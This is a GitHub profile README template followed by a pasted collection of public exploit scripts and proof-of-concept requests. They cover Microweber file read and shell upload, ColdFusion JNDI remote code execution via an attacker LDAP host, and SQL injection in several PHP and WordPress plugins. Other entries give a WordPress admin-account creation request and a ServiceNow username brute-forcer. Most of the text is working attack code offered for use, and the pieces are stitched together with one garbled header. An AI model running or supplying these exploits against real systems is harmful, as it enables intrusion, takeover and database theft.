- 👋 Hi, I’m @enesamaafkolan
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
enesamaafkolan/enesamaafkolan is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
git clone https://github.com/enesamaafkolan/enesamaafkolan
# Exploit Title: Microweber CMS v1.2.10 Local File Inclusion (Authenticated)
# Date: 22.02.2022
# Exploit Author: Talha Karakumru <talhakarakumru[at]gmail.com>
# Vendor Homepage: https://microweber.org/
# Software Link: https://github.com/microweber/microweber/archive/refs/tags/v1.2.10.zip
# Version: Microweber CMS v1.2.10
# Tested on: Microweber CMS v1.2.10

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microweber CMS v1.2.10 Local File Inclusion (Authenticated)',
        'Description' => %q{
          Microweber CMS v1.2.10 has a backup functionality. Upload and download endpoints can be combined to read any file from the filesystem.
          Upload function may delete the local file if the web service user has access.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Talha Karakumru <talhakarakumru[at]gmail.com>'
        ],
        'References' => [
          ['URL', 'https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/']
        ],
        'Notes' => {
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ OS_RESOURCE_LOSS ]
        },
        'Targets' => [
          [ 'Microweber v1.2.10', {} ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2022-01-30'
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Microweber', '/']),
        OptString.new('USERNAME', [true, 'The admin\'s username for Microweber']),
        OptString.new('PASSWORD', [true, 'The admin\'s password for Microweber']),
        OptString.new('LOCAL_FILE_PATH', [true, 'The path of the local file.']),
        OptBool.new('DEFANGED_MODE', [true, 'Run in defanged mode', true])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'admin', 'login')
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Microweber CMS cannot be reached.')
    end

    print_status 'Checking if it\'s Microweber CMS.'

    if res.code == 200 && !res.body.include?('Microweber')
      print_error 'Microweber CMS has not been detected.'
      Exploit::CheckCode::Safe
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    print_good 'Microweber CMS has been detected.'

    return check_version(res.body)
  end

  def check_version(res_body)
    print_status 'Checking Microweber\'s version.'

    begin
      major, minor, build = res_body[/Version:\s+(\d+\.\d+\.\d+)/].gsub(/Version:\s+/, '').split('.')
      version = Rex::Version.new("#{major}.#{minor}.#{build}")
    rescue NoMethodError, TypeError
      return Exploit::CheckCode::Safe
    end

    if version == Rex::Version.new('1.2.10')
      print_good 'Microweber version ' + version.to_s
      return Exploit::CheckCode::Appears
    end

    print_error 'Microweber version ' + version.to_s

    if version < Rex::Version.new('1.2.10')
      print_warning 'The versions that are older than 1.2.10 have not been tested. You can follow the exploitation steps of the official vulnerability report.'
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Safe
  end

  def try_login
    print_status 'Trying to log in.'
    res = send_request_cgi({
      'method' => 'POST',
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri.path, 'api', 'user_login'),
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'lang' => '',
        'where_to' => 'admin_content'
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Log in request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    json_res = res.get_json_document

    if !json_res['error'].nil? && json_res['error'] == 'Wrong username or password.'
      fail_with(Failure::BadConfig, 'Wrong username or password.')
    end

    if !json_res['success'].nil? && json_res['success'] == 'You are logged in'
      print_good 'You are logged in.'
      return
    end

    fail_with(Failure::Unknown, 'An unknown error occurred.')
  end

  def try_upload
    print_status 'Uploading ' + datastore['LOCAL_FILE_PATH'] + ' to the backup folder.'

    referer = ''
    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
      referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
    else
      referer = full_uri
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),
      'vars_get' => {
        'src' => datastore['LOCAL_FILE_PATH']
      },
      'headers' => {
        'Referer' => referer
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Upload request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    if res.headers['Content-Type'] == 'application/json'
      json_res = res.get_json_document

      if json_res['success']
        print_good json_res['success']
        return
      end

      fail_with(Failure::Unknown, res.body)
    end

    fail_with(Failure::BadConfig, 'Either the file cannot be read or the file does not exist.')
  end

  def try_download
    filename = datastore['LOCAL_FILE_PATH'].include?('\\') ? datastore['LOCAL_FILE_PATH'].split('\\')[-1] : datastore['LOCAL_FILE_PATH'].split('/')[-1]
    print_status 'Downloading ' + filename + ' from the backup folder.'

    referer = ''
    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
      referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
    else
      referer = full_uri
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),
      'vars_get' => {
        'filename' => filename
      },
      'headers' => {
        'Referer' => referer
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Download request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    if res.headers['Content-Type'] == 'application/json'
      json_res = res.get_json_document

      if json_res['error']
        fail_with(Failure::Unknown, json_res['error'])
        return
      end
    end

    print_status res.body
  end

  def run
    if datastore['DEFANGED_MODE']
      warning = <<~EOF
        Triggering this vulnerability may delete the local file if the web service user has the permission.
        If you want to continue, disable the DEFANGED_MODE.
        => set DEFANGED_MODE false
      EOF

      fail_with(Failure::BadConfig, warning)
    end

    try_login
    try_upload
    try_download
  end
end
# Exploit Title: Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)
# Google Dork: intext:"adobe coldfusion 11"
# Date: 2022-22-02
# Exploit Author: Amel BOUZIANE-LEBLOND (https://twitter.com/amellb)
# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html
# Version: Adobe Coldfusion (11.0.03.292866)
# Tested on: Microsoft Windows Server & Linux

# Description:
# ColdFusion allows an unauthenticated user to connect to any LDAP server. An attacker can exploit it to achieve remote code execution.
# JNDI attack via the 'verifyldapserver' parameter on the utils.cfc

==================== 1.Setup rogue-jndi Server ====================

https://github.com/veracode-research/rogue-jndi


==================== 2.Preparing the Attack =======================

java -jar target/RogueJndi-1.1.jar --command "touch /tmp/owned" --hostname "attacker_box"

==================== 3.Launch the Attack ==========================


http://REDACTED/CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=LDAP_SERVER&vport=LDAP_PORT&vstart=&vusername=&vpassword=&returnformat=json


curl -i -s -k -X $'GET' \
    -H $'Host: target' \
    --data-binary $'\x0d\x0a\x0d\x0a' \
    $'http://REDACTED//CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=LDAP_SERVER&vport=LDAP_PORT&vstart=&vusername=&vpassword=&returnformat=json'


==================== 4.RCE =======================================

Depend on the target need to compile the rogue-jndi server with JAVA 7 or 8
Can be done by modify the pom.xml as below

<configuration>
<source>7</source>
<target>7</target>
</configuration>
# Title: Air Cargo Management System v1.0 - SQLi
# Author: nu11secur1ty
# Date: 02.18.2022
# Vendor: https://www.sourcecodester.com/users/tips23
# Software: https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html
# Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/2022/Air-Cargo-Management-System

# Description:
The `ref_code` parameter from Air Cargo Management System v1.0 appears
to be vulnerable to SQL injection attacks.
The payload '+(select
load_file('\\\\c5idmpdvfkqycmiqwv299ljz1q7jvej5mtdg44t.https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html\\hag'))+'
was submitted in the ref_code parameter.
This payload injects a SQL sub-query that calls MySQL's load_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed.
WARNING: If this is in some external domain, or some subdomain
redirection, or internal whatever, this will be extremely dangerous!
Status: CRITICAL


[+] Payloads:

---
Parameter: ref_code (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=trace&ref_code=258044'+(select
load_file('\\\\c5idmpdvfkqycmiqwv299ljz1q7jvej5mtdg44t.https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html\\hag'))+''
AND (SELECT 9012 FROM (SELECT(SLEEP(3)))xEdD) AND 'JVki'='JVki
---
Exploit Title: Thinfinity VirtualUI  2.5.26.2 - Information Disclosure
Date: 18/01/2022
Exploit Author: Daniel Morales
Vendor: https://www.cybelesoft.com <https://www.cybelesoft.com/>
Software Link: https://www.cybelesoft.com/thinfinity/virtualui/ <https://www.cybelesoft.com/thinfinity/virtualui/>
Version vulnerable: Thinfinity VirtualUI < v2.5.26.2
Tested on: Microsoft Windows
CVE: CVE-2021-46354

How it works
External service interaction arises when it is possible to induce an application to interact with an arbitrary external service. The ability to send requests to other systems can allow the vulnerable server to filtrate the real IP of the webserver or increase the attack surface (it may be used also to filtrate the real IP behind a CDN).

Payload
An example of the HTTP request "https://example.com/cmd <https://example.com/cmd>?
cmd=connect&wscompression=true&destAddr=domain.com <http://domain.com/>
&scraper=fmx&screenWidth=1918&screenHeight=934&fitmode=0&argumentsp=&orientation=0&browserWidth=191
8&browserHeight=872&supportCur=true&id=null&devicePixelRatio=1&isMobile=false&isLandscape=true&supp
ortsFullScreen=true&webapp=false”

Where "domain.com <http://domain.com/>" is the external endpoint to be requested.

Vulnerable versions
It has been tested in VirtualUI version 2.1.28.0, 2.1.32.1 and 2.5.26.2

References
https://github.com/cybelesoft/virtualui/issues/3 <https://github.com/cybelesoft/virtualui/issues/3>
https://www.tenable.com/cve/CVE-2021-46354 <https://www.tenable.com/cve/CVE-2021-46354>
https://twitter.com/daExploit Title: Thinfinity VirtualUI 2.5.41.0  - IFRAME Injection
Date: 16/12/2021
Exploit Author: Daniel Morales
Vendor: https://www.cybelesoft.com <https://www.cybelesoft.com/>
Software Link: https://www.cybelesoft.com/thinfinity/virtualui/ <https://www.cybelesoft.com/thinfinity/virtualui/>
Version: Thinfinity VirtualUI < v3.0
Tested on: Microsoft Windows
CVE: CVE-2021-45092

How it works
By accessing the following payload (URL) an attacker could iframe any external website (of course, only external endpoints that allows being iframed).

Payload
The vulnerable vector is "https://example.com/lab.html?vpath=//wikipedia.com <https://example.com/lab.html?vpath=//wikipedia.com> " where "vpath=//" is the pointer to the external site to be iframed.

Vulnerable versions
It has been tested in VirtualUI version 2.1.37.2, 2.1.42.2, 2.5.0.0, 2.5.36.1, 2.5.36.2 and 2.5.41.0.

References
https://github.com/cybelesoft/virtualui/issues/2 <https://github.com/cybelesoft/virtualui/issues/2>
https://www.tenable.com/cve/CVE-2021-45092 <https://www.tenable.com/cve/CVE-2021-45092>
https://twitter.com/danielmofer <https://twitter.com/danielmofer>
nielmofer <https://twitter.com/danielmofer>
# Exploit Title: Microweber 1.2.11 - Remote Code Execution (RCE) (Authenticated)
# Google Dork: NA
# Date: 02/17/2022
# Exploit Author: Chetanya Sharma @AggressiveUser
# Vendor Homepage: https://microweber.org/
# Software Link: https://github.com/microweber/microweber
# Version: 1.2.11
# Tested on: [KALI OS]
# CVE : CVE-2022-0557
# Reference : https://huntr.dev/bounties/660c89af-2de5-41bc-aada-9e4e78142db8/

# Step To Reproduce
- Login using Admin Creds.
- Navigate to User Section then Add/Modify Users
- Change/Add image of profile and Select a Crafted Image file
- Crafted image file Aka A image file which craft with PHP CODES for execution 
- File Extension of Crafted File is PHP7 like "Sample.php7"
- -Path of Uploaded Crafted SHELL https://localhost/userfiles/media/default/shell.php7
- # Title: WordPress Plugin MasterStudy LMS 2.7.5 - Unauthenticated Admin Account Creation
# Date: 16.02.2022
# Author: Numan Türle
# CVE: CVE-2022-0441
# Software Link: https://wordpress.org/plugins/masterstudy-lms-learning-management-system/
# Version: <2.7.6
# https://www.youtube.com/watch?v=SI_O6CHXMZk
# https://gist.github.com/numanturle/4762b497d3b56f1a399ea69aa02522a6
# https://wpscan.com/vulnerability/173c2efe-ee9c-4539-852f-c242b4f728ed


POST /wp-admin/admin-ajax.php?action=stm_lms_register&nonce=[NONCE] HTTP/1.1
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: tr,en;q=0.9,tr-TR;q=0.8,en-US;q=0.7,el;q=0.6,zh-CN;q=0.5,zh;q=0.4
Content-Type: application/json
Content-Length: 339

{"user_login":"USERNAME","user_email":"EMAIL@TLD","user_password":"PASSWORD","user_password_re":"PASSWORD","become_instructor":"","privacy_policy":true,"degree":"","expertize":"","auditory":"","additional":[],"additional_instructors":[],"profile_default_fields_for_register":{"wp_capabilities":{"value":{"administrator":1}}}}
# Exploit Title: ServiceNow - Username Enumeration
# Google Dork: NA
# Date: 12 February 2022
# Exploit Author: Victor Hanna (Trustwave SpiderLabs)
# Author Github Page: https://9lyph.github.io/CVE-2021-45901/
# Vendor Homepage: https://www.servicenow.com/
# Software Link: https://docs.servicenow.com/bundle/orlando-servicenow-platform/page/product/mid-server/task/t_DownloadMIDServerFiles.html
# Version: Orlando
# Tested on: MAC OSX
# CVE : CVE-2021-45901

#!/usr/local/bin/python3
# Author: Victor Hanna (SpiderLabs)
# User enumeration script SNOW
# Requires valid 1. JSESSION (anonymous), 2. X-UserToken and 3. CSRF Token

import requests
import re
import urllib.parse
from colorama import init
from colorama import Fore, Back, Style
import sys
import os
import time

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def banner():
    print ("[+]********************************************************************************[+]")
    print ("|   Author : Victor Hanna (9lyph)["+Fore.RED + "SpiderLabs" +Style.RESET_ALL+"]\t\t\t\t\t    |")
    print ("|   Decription: SNOW Username Enumerator                                            |")
    print ("|   Usage : "+sys.argv[0]+"                                                        |")
    print ("|   Prequisite: \'users.txt\' needs to contain list of users                          |")   
    print ("[+]********************************************************************************[+]")

def main():
    os.system('clear')
    banner()
    proxies = {
        "http":"http://127.0.0.1:8080/",
        "https":"http://127.0.0.1:8080/"
    }
    url = "http://<redacted>/"
    try:
        # s = requests.Session()
        # s.verify = False
        r = requests.get(url, timeout=10, verify=False, proxies=proxies)
        JSESSIONID = r.cookies["JSESSIONID"]
        glide_user_route = r.cookies["glide_user_route"]
        startTime = (str(time.time_ns()))
        # print (startTime[:-6])
    except requests.exceptions.Timeout:
        print ("[!] Connection to host timed out !")
        sys.exit(1)
    except requests.exceptions.ProxyError:
        print ("[!] Can't communicate with proxy !")
        sys.exit(1)

    with open ("users.txt", "r") as f:
        usernames = f.readlines()
        print (f"[+] Brute forcing ....")
        for users in usernames:
            url = "http://<redacted>/$pwd_reset.do?sysparm_url=ss_default"
            headers1 = {
                "Host": "<redacted>",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Cookie": "glide_user_route="+glide_user_route+"; JSESSIONID="+JSESSIONID+"; __CJ_g_startTime=\'"+startTime[:-6]+"\'"
                }

            try:
                # s = requests.Session()
                # s.verify = False
                r = requests.get(url, headers=headers1, timeout=20, verify=False, proxies=proxies)
                obj1 = re.findall(r"pwd_csrf_token", r.text)
                obj2 = re.findall(r"fireAll\(\"ck_updated\"", r.text)
                tokenIndex = (r.text.index(obj1[0]))
                startTime2 = (str(time.time_ns()))
                # userTokenIndex = (r.text.index(obj2[0]))
                # userToken = (r.text[userTokenIndex+23 : userTokenIndex+95])
                token = (r.text[tokenIndex+45:tokenIndex+73])
                url = "http://<redacted>/xmlhttp.do"
                headers2 = {
                    "Host": "<redacted>",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "http://<redacted>/$pwd_reset.do?sysparm_url=ss default",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Content-Length": "786",
                    "Origin": "http://<redacted>/",
                    "Connection": "keep-alive",
                    # "X-UserToken":""+userToken+"",
                    "Cookie": "glide_user_route="+glide_user_route+";JSESSIONID="+JSESSIONID+"; __CJ_g_startTime=\'"+startTime2[:-6]+"\'"
                    }

                data = {
                    "sysparm_processor": "PwdAjaxVerifyIdentity",
                    "sysparm_scope": "global",
                    "sysparm_want_session_messages": "true",
                    "sysparm_name":"verifyIdentity",
                    "sysparm_process_id":"c6b0c20667100200a5a0f3b457415ad5",
                    "sysparm_processor_id_0":"fb9b36b3bf220100710071a7bf07390b",
                    "sysparm_user_id_0":""+users.strip()+"",
                    "sysparm_identification_number":"1",
                    "sysparam_pwd_csrf_token":""+token+"",
                    "ni.nolog.x_referer":"ignore",
                    "x_referer":"$pwd_reset.do?sysparm_url=ss_default"
                    }

                payload_str = urllib.parse.urlencode(data, safe=":+")

            except requests.exceptions.Timeout:
                print ("[!] Connection to host timed out !")
                sys.exit(1)

            try:
                # s = requests.Session()
                # s.verify = False
                time.sleep(2)
                r = requests.post(url, headers=headers2, data=payload_str, timeout=20, verify=False, proxies=proxies)
                if "500" in r.text:
                    print (Fore.RED + f"[-] Invalid user: {users.strip()}" + Style.RESET_ALL)
                    f = open("enumeratedUserList.txt", "a+")
                    f.write(Fore.RED + f"[-] Invalid user: {users.strip()}\n" + Style.RESET_ALL)
                    f.close()
                elif "200" in r.text:
                    print (Fore.GREEN + f"[+] Valid user: {users.strip()}" + Style.RESET_ALL)
                    f = open("enumeratedUserList.txt", "a+")
                    f.write(Fore.GREEN + f"[+] Valid user: {users.strip()}\n" + Style.RESET_ALL)
                    f.close()
                else:
                    print (Fore.RED + f"[-] Invalid user: {users.strip()}" + Style.RESET_ALL)
                    f = open("enumeratedUserList.txt", "a+")
                    f.write(Fore.RED + f"[-] Invalid user: {users.strip()}\n" + Style.RESET_ALL)
                    f.close()
            except KeyboardInterrupt:
                sys.exit()
            except requests.exceptions.Timeout:
                print ("[!] Connection to host timed out !")
                sys.exit(1)
            except Exception as e:
                print (Fore.RED + f"Unable to connect to host" + Style.RESET_ALL)

if __name__ == "__main__":
    main ()
  # Exploit Title: WordPress Plugin WP User Frontend 3.5.25 - SQLi (Authenticated)
# Date 20.02.2022
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://wedevs.com/
# Software Link: https://downloads.wordpress.org/plugin/wp-user-frontend.3.5.25.zip
# Version: < 3.5.25
# Tested on: Ubuntu 20.04
# CVE: CVE-2021-25076
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-25076/README.md

'''
Description:
The WP User Frontend WordPress plugin before 3.5.26 does not validate and escape the status parameter
before using it in a SQL statement in the Subscribers dashboard, leading to an SQL injection.
Due to the lack of sanitisation and escaping, this could also lead to Reflected Cross-Site Scripting
'''

banner = '''

 _|_|_|  _|      _|  _|_|_|_|              _|_|      _|      _|_|      _|                _|_|    _|_|_|_|    _|    _|_|_|_|_|    _|_|_| 
_|        _|      _|  _|                  _|    _|  _|  _|  _|    _|  _|_|              _|    _|  _|        _|  _|          _|  _|       
_|        _|      _|  _|_|_|  _|_|_|_|_|      _|    _|  _|      _|      _|  _|_|_|_|_|      _|    _|_|_|    _|  _|        _|    _|_|_|   
_|          _|  _|    _|                    _|      _|  _|    _|        _|                _|            _|  _|  _|      _|      _|    _| 
  _|_|_|      _|      _|_|_|_|            _|_|_|_|    _|    _|_|_|_|    _|              _|_|_|_|  _|_|_|      _|      _|          _|_|   
                                                                                                                                          
                                        [+] WP User Frontend - SQL Injection
                                        [@] Developed by Ron Jost (Hacker5preme)
'''
print(banner)

import argparse
from datetime import datetime
import os
import requests
import json

# User-Input:
my_parser = argparse.ArgumentParser(description= 'WP User Frontend - SQL-Injection (Authenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD



print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))

# Authentication:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'
check = session.get(auth_url)
# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}
auth = session.post(auth_url, headers=header, data=body)

# SQL-Injection (Exploit):
# Generate payload for sqlmap
cookies_session = session.cookies.get_dict()
cookie = json.dumps(cookies_session)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')
cookie = cookie.replace(',', '; ')
print('[*] Payload for SQL-Injection:')
exploitcode_url = r'sqlmap -u "http://' + target_ip + ':' + target_port + wp_path + r'wp-admin/admin.php?page=wpuf_subscribers&post_ID=1&status=1" '
exploitcode_risk = '--level 2 --risk 2 '
exploitcode_cookie = '--cookie="' + cookie + '" '
print('    Sqlmap options:')
print('     -a, --all           Retrieve everything')
print('     -b, --banner        Retrieve DBMS banner')
print('     --current-user      Retrieve DBMS current user')
print('     --current-db        Retrieve DBMS current database')
print('     --passwords         Enumerate DBMS users password hashes')
print('     --tables            Enumerate DBMS database tables')
print('     --columns           Enumerate DBMS database table column')
print('     --schema            Enumerate DBMS schema')
print('     --dump              Dump DBMS database table entries')
print('     --dump-all          Dump all DBMS databases tables entries')
retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')
exploitcode = exploitcode_url + exploitcode_risk + exploitcode_cookie + retrieve_mode + ' -p status -v 0 --answers="follow=Y" --batch'
os.system(exploitcode)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
     # Exploit Title: WordPress Plugin Secure Copy Content Protection and Content Locking 2.8.1 - SQL-Injection (Unauthenticated)
# Date 08.02.2022
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://ays-pro.com/
# Software Link: https://downloads.wordpress.org/plugin/secure-copy-content-protection.2.8.1.zip
# Version: < 2.8.2
# Tested on: Ubuntu 20.04
# CVE: CVE-2021-24931
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24931/README.md

'''
Description:
The Secure Copy Content Protection and Content Locking WordPress plugin before 2.8.2 does not escape the
sccp_id parameter of the ays_sccp_results_export_file AJAX action (available to both unauthenticated
and authenticated users) before using it in a SQL statement, leading to an SQL injection.
'''

banner = '''

 .--. .-..-. .--.       .---.  .--. .---.   ,-.       .---.   .-. .--. .----.  ,-.
: .--': :: :: .--'      `--. :: ,. :`--. :.'  :       `--. : .'.': .; :`--  ;.'  :
: :   : :: :: `;  _____   ,',': :: :  ,',' `: : _____   ,','.'.'_`._, : .' '  `: :
: :__ : `' ;: :__:_____:.'.'_ : :; :.'.'_   : ::_____:.'.'_ :_ ` :  : : _`,`.  : :
`.__.' `.,' `.__.'      :____;`.__.':____;  :_;       :____;  :_:   :_:`.__.'  :_;
                            
                        [+] Copy Content Protection and Content Locking - SQL Injection
                        [@] Developed by Ron Jost (Hacker5preme)
                        
'''
print(banner)
import argparse
from datetime import datetime
import os

# User-Input:
my_parser = argparse.ArgumentParser(description= 'Copy Content Protection and Content Locking SQL-Injection (unauthenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH

# Exploit:
print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))
print('[*] Payload for SQL-Injection:')
exploitcode_url = r'sqlmap "http://' + target_ip + ':' + target_port + wp_path + r'wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)*&type=json" '
print('    Sqlmap options:')
print('     -a, --all           Retrieve everything')
print('     -b, --banner        Retrieve DBMS banner')
print('     --current-user      Retrieve DBMS current user')
print('     --current-db        Retrieve DBMS current database')
print('     --passwords         Enumerate DBMS users password hashes')
print('     --tables            Enumerate DBMS database tables')
print('     --columns           Enumerate DBMS database table column')
print('     --schema            Enumerate DBMS schema')
print('     --dump              Dump DBMS database table entries')
print('     --dump-all          Dump all DBMS databases tables entries')
retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')
exploitcode = exploitcode_url +  retrieve_mode + ' --answers="follow=Y" --batch -v 0'
os.system(exploitcode)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
